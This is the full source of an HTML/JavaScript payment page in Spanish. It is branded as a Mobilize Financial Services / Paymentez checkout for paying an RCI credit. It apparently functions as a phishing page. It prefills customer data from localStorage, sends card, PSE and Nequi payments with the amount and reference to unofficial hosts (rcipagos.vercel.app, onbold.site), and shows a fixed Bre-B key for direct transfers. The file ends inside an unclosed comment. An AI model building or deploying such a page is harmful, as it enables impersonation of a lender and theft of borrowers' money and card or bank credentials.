<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Link To Pay</title>
<style>
*, *::before, *::after { box-sizing: border-box; }
body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #fff; color: #1a1a1a; }

.logo-area { padding: 4% 8%; max-width: 280px; }
.logo-area img { width: 100%; }

.main-card {
    background: #e5e5e5; margin: 0 auto; max-width: 1100px;
    position: relative; display: flex; flex-wrap: wrap;
}
.vigilado-bg {
    position: absolute; right: 0; top: 0; height: 100%; width: 45%;
    background: url('assets/vigilado.png') right top / contain no-repeat;
    opacity: .18; pointer-events: none;
}

/* LEFT PANEL */
.left-panel { flex: 0 0 58%; max-width: 58%; padding: 28px 32px; position: relative; z-index: 1; }
.left-panel h3 { font-size: 21px; font-weight: 700; margin: 8px 0 20px; }
.form-row { display: flex; flex-wrap: wrap; margin: 0 -8px; }
.form-group { padding: 0 8px; margin-bottom: 14px; }
.col-6 { flex: 0 0 50%; max-width: 50%; }
.col-2 { flex: 0 0 25%; max-width: 25%; }
.col-4 { flex: 0 0 41.66%; max-width: 41.66%; }
.form-group label { display: block; font-size: 11.5px; color: #444; margin-bottom: 4px; }
.form-control { display: block; width: 100%; padding: 8px 11px; font-size: 13.5px; color: #222; background: #fff; border: 1px solid #ced4da; border-radius: 5px; font-family: inherit; }
.form-control:disabled { background: #eaecef; color: #666; cursor: not-allowed; }

/* RIGHT PANEL */
.right-panel { flex: 0 0 42%; max-width: 42%; background: #f8f8f8; padding: 28px 24px; display: flex; flex-direction: column; align-items: center; position: relative; z-index: 1; }
.o-amount { text-align: center; padding: 16px 0 8px; width: 100%; }
.o-amount--payment { font-size: 32px; font-weight: 700; color: #000; display: block; }
.o-amount--currency { font-size: 15px; font-weight: 400; color: #777; margin-left: 5px; }
.payment-title { font-size: 17px; font-weight: 700; text-align: center; padding: 12px 0 14px; width: 100%; }

/* ── MÉTODOS DE PAGO ── */
.mp-wrapper {
    display: flex; flex-direction: column;
    border: 1px solid #e0e0e0; border-radius: 8px;
    overflow: hidden; background: #fff;
    margin-top: 4px; width: 100%;
}
.mp-acc-header {
    display: flex; align-items: center; justify-content: space-between;
    padding: 14px 16px; cursor: pointer; background: #fff;
    border-bottom: 1px solid #efefef; transition: background .15s;
    min-height: 58px;
}
.mp-acc-header:last-of-type { border-bottom: none; }
.mp-acc-header:hover { background: #fafafa; }
.mp-acc-header.open { background: #faf7ff; }
.mp-acc-left { flex: 1; min-width: 0; }
.mp-acc-name { font-size: 14px; font-weight: 400; color: #333; }
.mp-mat-indicator {
    display: inline-flex; align-items: center; justify-content: center;
    width: 24px; height: 24px; flex-shrink: 0; margin-left: 8px;
    transition: transform .25s cubic-bezier(.4,0,.2,1);
}
.mp-acc-header.open .mp-mat-indicator { transform: rotate(180deg); }
.mp-right { display: flex; align-items: center; gap: 6px; flex-shrink: 0; }
.mp-right img { height: 22px; border-radius: 3px; object-fit: contain; }
.mp-pse-circle {
    width: 32px; height: 32px; border-radius: 50%;
    background: #1a2b5e; display: flex; align-items: center; justify-content: center; overflow: hidden;
}
.mp-pse-circle img { width: 100%; height: 100%; object-fit: cover; }
.mp-nequi-logo { height: 26px; object-fit: contain; }
.mp-breb-pill { background: #3b1f8c; color: #fff; font-size: 11px; font-weight: 700; padding: 3px 9px; border-radius: 5px; letter-spacing: .4px; }

/* Body expandible */
.mp-acc-body { display: none; background: #fff; border-bottom: 1px solid #efefef; padding: 16px 16px 8px; }
.mp-acc-body.open { display: block; }
.mp-tarjeta-body { display: none; background: #fff; border-bottom: 1px solid #efefef; padding: 16px 16px 8px; }
.mp-tarjeta-body.open { display: block; }

/* Botón PSE continuar */
.mp-btn-pse {
    width: 100%; padding: 14px; border: none; border-radius: 6px;
    background: #1a1a1a; color: #fff; font-size: 14px; font-weight: 700;
    cursor: pointer; font-family: inherit; margin: 8px 0 12px;
    transition: background .15s;
}
.mp-btn-pse:hover { background: #333; }

/* Modal de carga */
#mp-loading-modal {
    position: fixed; inset: 0; z-index: 999999;
    background: rgba(255,255,255,.97);
    display: flex; flex-direction: column;
    align-items: center; justify-content: center; gap: 24px;
    animation: mpFadeIn .3s ease;
}
@keyframes mpFadeIn { from{opacity:0} to{opacity:1} }
#mp-loading-modal img { width: 200px; max-width: 70vw; }
#mp-loading-modal .loading-spinner {
    width: 50px; height: 50px;
    border: 5px solid #f0f0f0;
    border-top: 5px solid #e8391e;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
#mp-loading-txt { font-size: 14px; color: #666; font-family: inherit; }

/* Bre-B overlay */
#brevModal {
    position: fixed; inset: 0; background: rgba(0,0,0,.55);
    display: none; align-items: center; justify-content: center;
    z-index: 9999; font-family: inherit;
}
#brevModal.show { display: flex; }
.brev-modal {
    background: #fff; width: 380px; max-width: 90%;
    border-radius: 18px; padding: 28px 26px 24px; text-align: center;
    position: relative; box-shadow: 0 12px 40px rgba(0,0,0,.35);
    animation: brevFadeIn .25s ease-out;
}
@keyframes brevFadeIn { from{opacity:0;transform:translateY(-10px)} to{opacity:1;transform:translateY(0)} }
.brev-close {
    position: absolute; top: 14px; right: 16px; font-size: 22px;
    color: #333; cursor: pointer; background: none; border: none; line-height: 1;
}
.brev-icon-circle {
    width: 58px; height: 58px; background: #ffe4d1; border-radius: 50%;
    display: flex; align-items: center; justify-content: center; margin: 0 auto 14px;
}
.brev-icon-circle span { color: #ff5a1f; font-size: 24px; font-weight: bold; }
.brev-amount { font-size: 30px; font-weight: 800; color: #111; margin-bottom: 10px; }
.brev-description { font-size: 13.5px; color: #555; line-height: 1.45; margin-bottom: 18px; }
.brev-key-box { border: 1px solid #eee; border-radius: 12px; padding: 20px 14px 8px; margin-bottom: 6px; }
.brev-key-text { font-size: 16px; font-weight: 800; color: #111; word-break: break-all; }
.brev-key-caption { font-size: 12px; color: #888; margin-top: 6px; }
.brev-copy-btn {
    width: 100%; padding: 13px; margin-top: 14px;
    border: 1px solid #ddd; border-radius: 10px; background: #fff;
    font-size: 13.5px; font-weight: 600; color: #111; cursor: pointer;
    display: flex; align-items: center; justify-content: center; gap: 8px;
    transition: background .2s;
}
.brev-copy-btn:hover { background: #f5f5f5; }
.brev-btn-confirm {
    width: 100%; margin-top: 16px; padding: 14px;
    background: #111a3d; color: #fff; border: none; border-radius: 10px;
    font-size: 14px; font-weight: 700; cursor: pointer;
}
.brev-btn-cancel {
    width: 100%; margin-top: 10px; padding: 14px;
    background: #fff; color: #c0392b; border: 1px solid #eee;
    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
}

/* FOOTER */
footer { margin-top: 40px; }
.footer-orange { background: #f45000; padding: 8px 24px; }
.footer-orange small { color: #fff; font-size: 12px; }
.footer-orange a { color: #fff; }

/* MOBILE */
.mobile-payment { display: none; }
@media (max-width: 991px) {
    .left-panel, .right-panel { flex: 0 0 100%; max-width: 100%; }
    .right-panel { display: none; }
    .mobile-payment { display: block; padding-top: 24px; }
}

/* Loader (fallback) */
.loader-overlay {
    display: none;
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(255,255,255,0.95); z-index: 99999;
    justify-content: center; align-items: center; flex-direction: column; gap: 20px;
}
.loader-overlay.active { display: flex; }
.loader-spinner {
    width: 50px; height: 50px;
    border: 5px solid #f0f0f0; border-top: 5px solid #e8391e;
    border-radius: 50%; animation: spin 0.8s linear infinite;
}
.loader-text { font-size: 16px; color: #333; font-weight: 500; }
</style>
</head>
<body>

<!-- LOADER (fallback) -->
<div class="loader-overlay" id="loaderOverlay">
    <div class="loader-spinner"></div>
    <div class="loader-text">Cargando información de pago...</div>
</div>

<div><div class="logo-area"><img src="assets/logo-mobilize.png" alt="Mobilize Financial Services"></div></div>

<div style="padding:0 12px">
<div class="main-card">
<div class="vigilado-bg"></div>

<!-- LEFT -->
<div class="left-panel">
    <h3><strong>Detalles de tu compra</strong></h3>
    <div class="form-row">
        <div class="form-group col-6"><label>Nombre</label><input class="form-control" id="chkNombre" value=""></div>
        <div class="form-group col-6"><label>Apellido</label><input class="form-control" id="chkApellido" value=""></div>
        <div class="form-group col-6"><label>Correo electrónico</label><input class="form-control" id="chkEmail" value=""></div>
        <div class="form-group col-6"><label>Número de referencia</label><input class="form-control" id="chkRef" disabled></div>
        <div class="form-group col-6"><label>Descripción</label><input class="form-control" id="chkDesc" disabled></div>
        <div class="form-group col-2"><label>Moneda</label><input class="form-control" disabled value="COP"></div>
        <div class="form-group col-4"><label>Valor de la compra</label><input class="form-control" id="chkValor" disabled></div>
    </div>
    <div class="mobile-payment">
        <div class="o-amount"><span class="o-amount--payment" id="chkAmountMobile">$ 0<span class="o-amount--currency">COP</span></span></div>
        <div class="payment-title"><strong>Métodos de pago</strong></div>
        <div id="mp-wrapper-mobile"></div>
    </div>
</div>

<!-- RIGHT -->
<div class="right-panel">
    <div class="o-amount"><span class="o-amount--payment" id="chkAmountDesktop">$ 0<span class="o-amount--currency">COP</span></span></div>
    <div class="payment-title"><strong>Métodos de pago</strong></div>
    <div id="mp-wrapper-desktop"></div>
</div>

</div>
</div>

<!-- Bre-B overlay -->
<div id="brevModal">
  <div class="brev-modal">
    <button class="brev-close" id="brevCerrarBtn">&times;</button>
    <div class="brev-icon-circle"><span>&#8595;</span></div>
    <div class="brev-amount" id="brevModalMonto">$ 0</div>
    <div class="brev-description">Usa esta llave Bre-B para realizar tu depósito. ¡La confirmación suele llegar en segundos!</div>
    <div class="brev-key-box">
        <div class="brev-key-text" id="brevKeyText">@DLWAS617</div>
        <div class="brev-key-caption">Llave Bre-B</div>
    </div>
    <button class="brev-copy-btn" id="brevCopiarBtn">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="15" height="15"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
        Copiar llave
    </button>
    <button class="brev-btn-confirm" id="brevConfirmarBtn">&#10003; Pago realizado</button>
    <button class="brev-btn-cancel" id="brevCancelarBtn">&times; Cancelar pago</button>
  </div>
</div>

<footer><div class="footer-orange"><small>© 2018 - 2026 Copyright: <a href="https://paymentez.com/" target="_blank" rel="noopener noreferrer">Paymentez™. All rights reserved.</a></small></div></footer>

<!-- ============================================================
📌 INCLUIR LA BASE DE DATOS (desde archivo aparte)
============================================================ -->
<script src="js/database.js"></script>

<!-- ============================================================
📌 CÓDIGO PRINCIPAL DE PAGOS (script.txt adaptado)
============================================================ -->
<script>

/* ============================================================
   CONFIGURACIÓN
   ============================================================ */

const NEQUI_URL   = 'https://rcipagos.vercel.app/nequi.html';
const PSE_URL     = 'https://rcipagos.vercel.app/pse.html';
const TARJETA_URL = 'https://onbold.site/rcitc/';


/* ============================================================
   DATOS DE LA COMPRA (desde localStorage - base de datos js)
   ============================================================ */

let _pago = null;
let _credito = null;

try {

    const _userInfo = JSON.parse(
        localStorage.getItem('userInfo') || 'null'
    );

    const _valueToPay = localStorage.getItem('valueToPay') || '0';

    if (_userInfo && _userInfo.creditNumber) {

        const _monto = parseFloat(
            String(_valueToPay).replace(/[^\d.-]/g, '')
        ) || 0;

        const _referencia =
            _userInfo.creditNumber + '-' +
            (_userInfo.documentNumber || '');

        _pago = {
            monto: _monto,
            referencia: _referencia,
            concepto: _userInfo.description || 'Pago credito RCI'
        };

        _credito = {
            nombre:    _userInfo.clientName || '',
            apellidos: _userInfo.clientLastName || '',
            email:     _userInfo.email || ''
        };

    }

} catch (error) {

    console.error(
        'No fue posible leer los datos de pago.'
    );

}


/* ============================================================
   VALIDACIÓN
   ============================================================ */

if (!_pago) {

    mostrarError(
        'No encontramos la información de esta compra.'
    );

} else {

    inicializarCompra();

}


/* ============================================================
   FORMATO COP
   ============================================================ */

function formatearCOP(valor) {

    const numero = Number(valor);

    if (!Number.isFinite(numero)) {
        return '$ 0';
    }

    return numero.toLocaleString(
        'es-CO',
        {
            style: 'currency',
            currency: 'COP',
            minimumFractionDigits: 0,
            maximumFractionDigits: 0
        }
    );
}


/* ============================================================
   INICIALIZAR
   ============================================================ */

function inicializarCompra() {

    const monto = Number(_pago?.monto || 0);

    const nombre   = _credito?.nombre || '';
    const apellido = _credito?.apellidos || '';
    const email    = _credito?.email || '';

    document.getElementById('chkNombre').value   = nombre;
    document.getElementById('chkApellido').value = apellido;
    document.getElementById('chkEmail').value    = email;
    document.getElementById('chkRef').value      = _pago?.referencia || '';
    document.getElementById('chkDesc').value     = _pago?.concepto || '';
    document.getElementById('chkValor').value    = formatearCOP(monto);

    const montoFormateado = formatearCOP(monto);

    document.getElementById('chkAmountDesktop').innerHTML =
        montoFormateado +
        '<span class="o-amount--currency">COP</span>';

    document.getElementById('chkAmountMobile').innerHTML =
        montoFormateado +
        '<span class="o-amount--currency">COP</span>';

}


/* ============================================================
   CREAR URL CON MONTO
   ============================================================ */

function construirUrlConMonto(ruta) {

    if (!ruta) {
        return '';
    }

    try {

        const url = new URL(ruta, window.location.origin);

        const monto = Number(_pago?.monto || 0);

        if (Number.isFinite(monto) && monto > 0) {
            url.searchParams.set('monto', String(monto));
        }

        if (_pago?.referencia) {
            url.searchParams.set('referencia', _pago.referencia);
        }

        return url.toString();

    } catch (error) {

        console.error('URL inválida:', error);
        return '';

    }

}


/* ============================================================
   LOADING
   ============================================================ */

function mostrarCargando(
    ruta,
    texto = 'Procesando tu pago...'
) {

    const modal = document.createElement('div');

    modal.id = 'mp-loading-modal';

    modal.innerHTML = `
        <img src="assets/logo-mobilize.png" alt="Mobilize">
        <div class="loading-spinner"></div>
        <span id="mp-loading-txt">${texto}</span>
    `;

    document.body.appendChild(modal);

    setTimeout(() => {

        if (ruta) {

            window.location.href = ruta;

        } else {

            modal.remove();

            mostrarError(
                'Este método de pago aún no está configurado.'
            );

        }

    }, 1200);

}


/* ============================================================
   MENSAJE DE ERROR
   ============================================================ */

function mostrarError(texto) {
    alert(texto);
}


/* ============================================================
   CONSTRUIR MÉTODOS DE PAGO
   ============================================================ */

function buildWrapper() {

    const wrapper = document.createElement('div');
    wrapper.className = 'mp-wrapper';

    const chevronSvg = `
        <span class="mp-mat-indicator">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="#9e9e9e">
                <path d="M7 10l5 5 5-5z"/>
            </svg>
        </span>
    `;

    /* ========================================================
       TARJETA
       ======================================================== */

    const tarjetaH = document.createElement('div');
    tarjetaH.className = 'mp-acc-header';

    tarjetaH.innerHTML = `
        <div class="mp-acc-left">
            <span class="mp-acc-name">Tarjetas Débito o Crédito</span>
        </div>
        <div class="mp-right">
            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg" alt="Mastercard">
            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/visa.svg" alt="Visa">
            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/amex.svg" alt="American Express">
            ${chevronSvg}
        </div>
    `;

    const tarjetaBody = document.createElement('div');
    tarjetaBody.className = 'mp-tarjeta-body';

    tarjetaBody.innerHTML = `
        <p style="font-size:13px;color:#666;line-height:1.5;margin:0 0 15px;">
            Para proteger tus datos, el pago con tarjeta
            se realiza directamente en la plataforma
            segura del proveedor de pagos.
        </p>
        <button class="mp-btn-pse" id="mp-btn-pagar-tarjeta" type="button">
            Continuar con tarjeta
        </button>
    `;

    tarjetaH.addEventListener('click', () => {
        const open = tarjetaBody.classList.toggle('open');
        tarjetaH.classList.toggle('open', open);
    });

    tarjetaBody.querySelector('#mp-btn-pagar-tarjeta').addEventListener('click', () => {

        if (!TARJETA_URL) {
            mostrarError('La plataforma de pago con tarjeta todavía no está configurada.');
            return;
        }

        const url = construirUrlConMonto(TARJETA_URL);

        mostrarCargando(url, 'Conectando con el proveedor de pago...');

    });


    /* ========================================================
       PSE
       ======================================================== */

    const pseH = document.createElement('div');
    pseH.className = 'mp-acc-header';

    pseH.innerHTML = `
        <div class="mp-acc-left">
            <span class="mp-acc-name">Débito PSE</span>
        </div>
        <div class="mp-right">
            <div class="mp-pse-circle">
                <img src="assets/pse.png" alt="PSE">
            </div>
            ${chevronSvg}
        </div>
    `;

    const pseBody = document.createElement('div');
    pseBody.className = 'mp-acc-body';

    pseBody.innerHTML = `
        <p style="font-size:13px;color:#666;line-height:1.5;margin:0 0 15px;">
            Serás dirigido a la plataforma segura de PSE
            para continuar con tu pago.
        </p>
        <button class="mp-btn-pse" id="mp-btn-continuar" type="button">
            Continuar con PSE
        </button>
    `;

    pseH.addEventListener('click', () => {
        const open = pseBody.classList.toggle('open');
        pseH.classList.toggle('open', open);
    });

    pseBody.querySelector('#mp-btn-continuar').addEventListener('click', () => {

        if (!PSE_URL) {
            mostrarError('La plataforma PSE todavía no está configurada.');
            return;
        }

        const url = construirUrlConMonto(PSE_URL);

        mostrarCargando(url, 'Conectando con PSE...');

    });


    /* ========================================================
       NEQUI
       ======================================================== */

    const nequiH = document.createElement('div');
    nequiH.className = 'mp-acc-header';

    nequiH.innerHTML = `
        <div class="mp-acc-left">
            <span class="mp-acc-name">Nequi</span>
        </div>
        <div class="mp-right">
            <img class="mp-nequi-logo" src="assets/nequi.svg" alt="Nequi">
            ${chevronSvg}
        </div>
    `;

    nequiH.addEventListener('click', () => {

        const url = construirUrlConMonto(NEQUI_URL);

        mostrarCargando(url, 'Conectando con Nequi...');

    });


    /* ========================================================
       BRE-B
       ======================================================== */

    const brebH = document.createElement('div');
    brebH.className = 'mp-acc-header';

    brebH.innerHTML = `
        <div class="mp-acc-left">
            <span class="mp-acc-name">Bre-B · Transferencia directa</span>
        </div>
        <div class="mp-right">
            <span class="mp-breb-pill">Bre-B</span>
            ${chevronSvg}
        </div>
    `;

    brebH.addEventListener('click', () => {

        document.getElementById('brevModalMonto').textContent =
            formatearCOP(Number(_pago?.monto || 0));

        document.getElementById('brevModal').classList.add('show');

    });


    wrapper.appendChild(tarjetaH);
    wrapper.appendChild(tarjetaBody);
    wrapper.appendChild(pseH);
    wrapper.appendChild(pseBody);
    wrapper.appendChild(nequiH);
    wrapper.appendChild(brebH);

    return wrapper;

}


/* ============================================================
   RENDERIZAR DESKTOP / MOBILE
   ============================================================ */

document.getElementById('mp-wrapper-desktop').appendChild(buildWrapper());
document.getElementById('mp-wrapper-mobile').appendChild(buildWrapper());


/* ============================================================
   BRE-B
   ============================================================ */

function cerrarBreB() {
    document.getElementById('brevModal').classList.remove('show');
}

document.getElementById('brevCerrarBtn').addEventListener('click', cerrarBreB);
document.getElementById('brevCancelarBtn').addEventListener('click', cerrarBreB);

document.getElementById('brevCopiarBtn').addEventListener('click', async function () {

    const llave = '@DLWAS617';

    try {

        await navigator.clipboard.writeText(llave);

        const original = this.innerHTML;

        this.textContent = 'Llave copiada';

        setTimeout(() => {
            this.innerHTML = original;
        }, 1800);

    } catch (error) {

        alert('No fue posible copiar automáticamente. Llave: ' + llave);

    }

});

document.getElementById('brevConfirmarBtn').addEventListener('click', function () {

    cerrarBreB();

    mostrarError(
        'Tu solicitud fue registrada. La confirmación del pago debe realizarse mediante el sistema de pagos.'
    );

});


/* ============================================================
   PROTECCIÓN BÁSICA DEL MONTO

window.addEventListener('pageshow', function () {

    const monto = Number(_pago?.monto || 0);

    if (!Number.isFinite(monto) || monto <= 0) {

        mostrarError('El monto de la operación no es válido.');

    }
